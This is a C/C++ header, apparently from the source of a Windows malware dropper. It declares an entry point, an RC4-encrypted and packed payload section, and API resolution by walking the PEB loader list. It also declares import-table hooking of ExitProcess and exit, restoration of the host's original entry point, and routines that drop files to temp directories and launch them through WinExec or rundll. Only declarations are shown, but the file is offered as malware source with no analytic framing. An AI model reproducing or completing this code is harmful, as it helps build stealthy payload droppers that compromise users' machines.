#ifndef droppercode_h__
#define droppercode_h__

#include <string>
using namespace std;

#include "common.h"
#include "DropperHeader.h"
#include "smc.h"
#include "XRefNames.h"

#pragma region CONSTANTS_AND_MACROS

enum {
	DATASECTION_ENDMARKER = 0x3E453C00,
};

#pragma region STRINGS_INDEXES
// STRINGS indexes

#define STRIDX_INSTALL_DIR		0
#define STRIDX_TMP_ENVVAR		1
#define STRIDX_TEMP_ENVVAR		2
#define STRIDX_KERNEL32_DLL     3
#define STRIDX_NTDLL_DLL		4
#define STRIDX_MSVCRT_DLL		5
#define STRIDX_LOADLIBRARYA		6
#define STRIDX_GETPROCADDRESS	7
#define STRIDX_RUNDLL			8
#define STRIDX_COMMAHFF8		9
#define STRIDX_HFF5				10
#define STRIDX_DIRSEP			11
#define STRIDX_USER32_DLL		12
#define STRIDX_RTLEXITUSERPROCESS 13
#define STRIDX_EXITCALL			14
#define STRIDX__EXITCALL		15
#define STRING_EXITPROCESS		16

#if _DEBUG
#define STRIDX_ERRORCREDIR		17
#define STRIDX_EXITPROCIDX		18
#define STRIDX_EXITPROCHOOKED   19
#define STRIDX_RESTOREOEP		20
#define STRIDX_EXITHOOKED		21
#define STRIDX_OEPRESTORED		22
#define STRIDX_CALLINGOEP		23
#define STRIDX_CREATEFILE_ERR   24
#define STRIDX_HFF5CALLING      25
#define STRIDX_HFF5CALLED	    26
#define STRIDX_INEXITPROC_HOOK  27
#define STRIDX_VECTORQUIT		28
#define STRIDX_VERIFYVERSION    29
#define STRIDX_SYSMAJORVER		30
#define STRIDX_SYSMINORVER		31
#define STRIDX_RESTORESTAGE1	32
#define STRIDX_RESTORESTAGE2	33
#define STRIDX_UNCOMPRESS_ERR   34
#endif

#pragma endregion

#pragma region DLL_CALL_ADDRESSES

// DLL calls indexes

// KERNEL32.dll
#define	CALL_OUTPUTDEBUGSTRINGA			0
#define	CALL_CREATEFILEA				1
#define CALL_CREATEDIRECTORYA			2
#define CALL_CLOSEHANDLE				3
#define	CALL_WRITEFILE					4
#define CALL_READFILE					5
#define CALL_SETFILEPOINTER				6
#define CALL_GETMODULEFILENAMEW			7
#define	CALL_VIRTUALALLOC				8
#define CALL_VIRTUALFREE				9
#define CALL_VIRTUALPROTECT				10
#define CALL_WINEXEC					11
#define CALL_FREELIBRARY				12
#define CALL_GETENVIRONMENTVARIABLEA	13
#define CALL_SETCURRENTDIRECTORYA		14
#define CALL_SETFILEATTRIBUTESA			15
#define CALL_DEBUGACTIVEPROCESS			16
#define CALL_GETCURRENTPROCESSID		17
#define CALL_CREATETHREAD				18
#define CALL_GETTHREADCONTEXT			19
#define CALL_SETTHREADCONTEXT			20
#define CALL_GETFILESIZE				21
#define CALL_SLEEP						22
#define CALL_GETLASTERROR				23
#define CALL_EXITPROCESS				24
#define CALL_LOADLIBRARY				25
#define CALL_GETPROCADDRESS				26
#define CALL_VIRTUALQUERY				27
#define CALL_VERIFYVERSIONINFO			28
#define CALL_GETVERSIONEX				29
#define CALL_GETMODULEHANDLE			30
#define CALL_GETMODULEFILENAMEA			31

// NTDLL.DLL
#define CALL_RTLEXITUSERPROCESS			32
// MSVCRT.dll
#define CALL_SPRINTF					33
#define CALL_EXIT						34
#define CALL__EXIT						35

// ADVAPI32.DLL
#define CALL_GETCURRENTHWPROFILE		36

#pragma endregion

// #define STRING(idx) (LPCSTR)strings[((DWORD*)stringsOffsets)[(idx)]]
#define STRING(idx) (char*)(strings + stringsOffsets[(idx)])
#define STRLEN(idx) _STRLEN_(STRING(idx))

#define MAX_BUF_SIZE 1024

#define S_SWAP(a,b) do { unsigned char t = S[a]; S[a] = S[b]; S[b] = t; } while(0)
//#define RC4_CRYPT(buf, buf_len, key, key_len, header) arc4((unsigned char*)key, key_len, 0, (unsigned char*)buf, buf_len, header)

#pragma region DATA_STRUCTURES

// DataSectionCryptoPack Characteristics

#define DSBCHAR_APLIB_PACKED	0x00000100
#define DSBCHAR_CRYPT_RC4		0x00001000

typedef FARPROC (WINAPI *GETPROCADDRESS)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *LOADLIBRARY)(LPCSTR);

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct {
	DWORD InLoadNext;
	DWORD InLoadPrev;
	DWORD InMemNext;
	DWORD InMemPrev;
	DWORD InInitNext;
	DWORD InInitPrev;
	DWORD ImageBase;
	PVOID EntryPoint;
	ULONG SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
} PEB_LIST_ENTRY, *PPEB_LIST_ENTRY;

char * _needed_strings[];
XREFNAMES data_imports[];

#pragma endregion

#pragma region REQUIRED_IMPORTS

typedef BOOL (WINAPI * DUMPFILE)(CHAR * fileName, CHAR* fileData, DWORD fileSize, DWORD originalSize, DropperHeader *header);
typedef DWORD (WINAPI * THREADPROC)(LPVOID lpParameter);

typedef void (WINAPI *OUTPUTDEBUGSTRING)(LPCTSTR lpOutputString);
typedef HANDLE (WINAPI *CREATEFILE)(LPCTSTR lpFileName,
									DWORD dwDesiredAccess,
									DWORD dwShareMode,
									LPSECURITY_ATTRIBUTES lpSecurityAttributes,
									DWORD dwCreationDisposition,
									DWORD dwFlagsAndAttributes,
									HANDLE hTemplateFile);
typedef BOOL (WINAPI * CREATEDIRECTORY)(
							LPCTSTR lpPathName,
							LPSECURITY_ATTRIBUTES lpSecurityAttributes
							);
typedef BOOL (WINAPI * CLOSEHANDLE)(
								HANDLE hObject
								);
typedef BOOL (WINAPI * WRITEFILE)(
					  HANDLE hFile,
					  LPCVOID lpBuffer,
					  DWORD nNumberOfBytesToWrite,
					  LPDWORD lpNumberOfBytesWritten,
					  LPOVERLAPPED lpOverlapped
					  );
typedef DWORD (WINAPI * SETFILEPOINTER)(
									HANDLE hFile,
									LONG lDistanceToMove,
									PLONG lpDistanceToMoveHigh,
									DWORD dwMoveMethod
									);
typedef BOOL (WINAPI * READFILE)(
					 HANDLE hFile,
					 LPVOID lpBuffer,
					 DWORD nNumberOfBytesToRead,
					 LPDWORD lpNumberOfBytesRead,
					 LPOVERLAPPED lpOverlapped
					 );
typedef DWORD (WINAPI * GETMODULEFILENAME)(
									   HMODULE hModule,
									   LPTSTR lpFilename,
									   DWORD nSize
									   );
typedef LPVOID (WINAPI * VIRTUALALLOC)(
						   LPVOID lpAddress,
						   SIZE_T dwSize,
						   DWORD flAllocationType,
						   DWORD flProtect
						   );
typedef BOOL (WINAPI * VIRTUALFREE)(
								LPVOID lpAddress,
								SIZE_T dwSize,
								DWORD dwFreeType
								);
typedef BOOL (WINAPI * VIRTUALPROTECT)(
								   LPVOID lpAddress,
								   SIZE_T dwSize,
								   DWORD flNewProtect,
								   PDWORD lpflOldProtect
								   );
typedef UINT (WINAPI * WINEXEC)(
							LPCSTR lpCmdLine,
							UINT uCmdShow
							);
typedef BOOL (WINAPI * FREELIBRARY)(
								HMODULE hModule
								);
typedef DWORD (WINAPI * GETENVIRONMENTVARIABLE)(
	LPCTSTR lpName,
	LPTSTR lpBuffer,
	DWORD nSize
	);
typedef BOOL (WINAPI * SETCURRENTDIRECTORY)(
	LPCTSTR lpPathName
	);

typedef BOOL (WINAPI * SETFILEATTRIBUTES)(
									  LPCTSTR lpFileName,
									  DWORD dwFileAttributes
									  );
typedef BOOL (WINAPI * DEBUGACTIVEPROCESS)(
									   DWORD dwProcessId
									   );
typedef DWORD (WINAPI * GETCURRENTPROCESSID)(void);
typedef HANDLE (WINAPI * CREATETHREAD)(
								   LPSECURITY_ATTRIBUTES lpThreadAttributes,
								   SIZE_T dwStackSize,
								   LPTHREAD_START_ROUTINE lpStartAddress,
								   LPVOID lpParameter,
								   DWORD dwCreationFlags,
								   LPDWORD lpThreadId
								   );
typedef BOOL (WINAPI * GETTHREADCONTEXT)(
									 HANDLE hThread,
									 LPCONTEXT lpContext
									 ); 
typedef BOOL (WINAPI * SETTHREADCONTEXT)(
									 HANDLE hThread,
									 const CONTEXT *lpContext
									 );
typedef DWORD (WINAPI * GETFILESIZE)(
								 HANDLE hFile,
								 LPDWORD lpFileSizeHigh
								 );
typedef void (WINAPI * SLEEP)(DWORD dwMilliseconds);

typedef DWORD (WINAPI * GETLASTERROR)(void); 

typedef VOID (WINAPI  * EXITPROCESS)(UINT uExitCode);

typedef int (*SPRINTF)(      
					 CHAR* lpOut,
					 CHAR* lpFmt,
					 ...
					 );

typedef SIZE_T (WINAPI *VIRTUALQUERY)(
								   LPCVOID lpAddress,
								   PMEMORY_BASIC_INFORMATION lpBuffer,
								   SIZE_T dwLength
								   );

typedef void (__cdecl *EXIT)(int status);

typedef void (__cdecl *_EXIT)(int status);

typedef BOOL (*VERIFYVERSIONINFO) (
							  OSVERSIONINFOEX* lpVersionInfo,
							  DWORD dwTypeMask,
							  DWORDLONG dwlConditionMask
							  );

typedef BOOL (*GETVERSIONEX)( OSVERSIONINFOA* lpVersionInfo );

typedef BOOL (*GETCURRENTHWPROFILE)(
									LPHW_PROFILE_INFO lpHwProfileInfo
									);

typedef HMODULE (*GETMODULEHANDLE)(LPCTSTR);

typedef void (*HFF5)(CHAR*, DWORD, STARTUPINFO*, PROCESS_INFORMATION*);

typedef void (*RC4_SKIP)(const unsigned char *key, size_t keylen, size_t skip,
						 unsigned char *data, size_t data_len, DropperHeader *header);


typedef DWORD (*HOOKCALL)(char *dll, 
				 char *name, 
				 DWORD hookFunc, 
				 UINT_PTR IAT_rva, 
				 DWORD imageBase, 
				 DropperHeader *header); 



#pragma endregion

#pragma region CUSTOM_INLINE_FUNCTIONS

// Important: Compiler must set /O2 (Maximize Speed) to ensure inline functions
// Although compiler provides #pragma intrinsic it is not 100% reliable

__forceinline void _MEMSET_( void *_dst, int _val, size_t _sz );
__forceinline void _MEMCPY_( void *_dst, void *_src, size_t _sz );
__forceinline BOOL _MEMCMP_( void *_src1, void *_src2, size_t _sz );
__forceinline size_t _STRLEN_(char *_src);
__forceinline void _TOUPPER_(char *s);
__forceinline  void _TOUPPER_CHAR(char *c);
__forceinline void _TOLOWER_(char *s);
__forceinline int _STRCMP_(char *_src1, char *_src2);
__forceinline int _STRCMPI_(char *_src1, char *_src2);
__forceinline char* _STRRCHR_(char const *s, int c);
__forceinline void _STRCAT_(char*_src1, char *_src2);
__forceinline void _ZEROMEM_(char* mem, int size);
__forceinline bool fuckUnicodeButCompare(PBYTE against ,PBYTE unicode, DWORD length );

#pragma endregion

// TODO change all _End function using macros

// *** Entry Point 
int __stdcall DropperEntryPoint( DropperHeader* header );
FUNCTION_END_DECL(DropperEntryPoint);

BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD fileSize, DWORD originalSize, DropperHeader* header);
FUNCTION_END_DECL(DumpFile);

DWORD WINAPI CoreThreadProc(LPVOID lpParameter);
FUNCTION_END_DECL(CoreThreadProc);

VOID WINAPI ExitProcessHook(UINT uExitCode);
FUNCTION_END_DECL(ExitProcessHook);

__declspec(noreturn) void __cdecl ExitHook(int status);
FUNCTION_END_DECL(ExitHook);

void arc4(const unsigned char *key, size_t keylen, size_t skip,
			  unsigned char *data, size_t data_len, DropperHeader *header);
FUNCTION_END_DECL(arc4);

DWORD HookCall(char* dll, char* name, DWORD hookFunc, UINT_PTR IAT_rva, DWORD imageBase, DropperHeader *header); 
FUNCTION_END_DECL(HookCall);

void generate_key(std::string& key, unsigned int length);

#define END_MARKER(ptr) do { memcpy(ptr, "<E>\0", 4); } while(0)
#define END_MARKER_AND_INCREMENT_PTR(ptr) do { END_MARKER(ptr); ptr += 4;  } while(0)

#endif /* droppercode_h__ */
